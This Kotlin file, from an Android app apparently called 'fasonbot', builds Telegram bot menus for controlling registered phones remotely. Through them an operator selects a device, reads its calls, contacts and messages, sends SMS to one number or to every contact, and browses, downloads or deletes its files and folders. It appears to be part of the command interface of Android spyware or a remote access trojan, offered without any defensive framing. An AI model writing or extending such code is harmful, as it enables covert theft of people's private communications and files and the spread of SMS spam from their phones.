package com.fasonbot.app.bot

import android.content.Context
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.action.FileItem

object Cb {
    const val DEVICE = "d"
    const val CALLS = "c"
    const val CONTACTS = "n"
    const val MESSAGES = "m"
    const val SEND_SMS = "s"
    const val SMS_SPECIFIC = "ss"
    const val SMS_ALL = "sa"
    const val BROWSE = "b"
    const val FILE_DL = "f"
    const val FILE_DEL = "x"
    const val FOLDER_DL = "D"
    const val FOLDER_DEL = "X"
    const val BACK_DEV = "bd"
    const val BACK_MENU = "bm"
    const val CANCEL = "co"
}

class KeyboardBuilder {

    private val gson = Gson()

    fun createInlineKeyboard(buttons: List<List<Pair<String, String>>>): JsonObject {
        val keyboard = buttons.map { row ->
            row.map { (text, callbackData) ->
                JsonObject().apply {
                    addProperty("text", text)
                    addProperty("callback_data", callbackData)
                }
            }
        }
        return JsonObject().apply { add("inline_keyboard", gson.toJsonTree(keyboard)) }
    }

    fun getDeviceSelectionButtons(context: Context): List<List<Pair<String, String>>> {
        DeviceManager.registerDevice(context)
        val devices = DeviceManager.getRegisteredDevices(context)
        return devices.map { device ->
            val icon = if (device.isOnline) "🟢" else "🔴"
            listOf("$icon ${device.deviceName}" to "${Cb.DEVICE}:${device.deviceId}")
        }
    }

    fun getCommandMenuButtons(deviceId: String): List<List<Pair<String, String>>> = listOf(
        listOf("📞 Calls" to "${Cb.CALLS}:$deviceId", "👥 Contacts" to "${Cb.CONTACTS}:$deviceId"),
        listOf("💬 Messages" to "${Cb.MESSAGES}:$deviceId", "📤 SMS" to "${Cb.SEND_SMS}:$deviceId"),
        listOf("📁 Files" to "${Cb.BROWSE}:$deviceId:"),
        listOf("◀️ Back" to "${Cb.BACK_DEV}:$deviceId")
    )

    fun getSmsSubMenuButtons(deviceId: String): List<List<Pair<String, String>>> = listOf(
        listOf("📱 To Number" to "${Cb.SMS_SPECIFIC}:$deviceId", "📢 To All" to "${Cb.SMS_ALL}:$deviceId"),
        listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId")
    )

    fun getFileBrowserButtons(files: List<FileItem>, deviceId: String, currentPath: String): List<List<Pair<String, String>>> {
        val buttons = mutableListOf<List<Pair<String, String>>>()
        files.forEach { item ->
            when {
                item.isParent -> buttons.add(listOf("⬆️ .." to "${Cb.BROWSE}:$deviceId:${item.path}"))
                item.isDirectory -> buttons.add(listOf(
                    "📁 ${item.name}" to "${Cb.BROWSE}:$deviceId:${item.path}",
                    "📥" to "${Cb.FOLDER_DL}:$deviceId:${item.path}",
                    "🗑️" to "${Cb.FOLDER_DEL}:$deviceId:${item.path}"
                ))
                item.path.isNotEmpty() -> {
                    val sizeText = if (item.displaySize.isNotEmpty()) " (${item.displaySize})" else ""
                    buttons.add(listOf(
                        "📄 ${item.name}$sizeText" to "${Cb.FILE_DL}:$deviceId:${item.path}",
                        "🗑️" to "${Cb.FILE_DEL}:$deviceId:${item.path}"
                    ))
                }
            }
        }
        buttons.add(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
        return buttons
    }

    fun createReplyKeyboard(buttons: List<List<String>>): JsonObject {
        val keyboard = buttons.map { row ->
            row.map { JsonObject().apply { addProperty("text", it) } }
        }
        return JsonObject().apply {
            add("keyboard", gson.toJsonTree(keyboard))
            addProperty("resize_keyboard", true)
        }
    }

    fun createForceReply(): JsonObject = JsonObject().apply {
        addProperty("force_reply", true)
        addProperty("selective", true)
    }
}
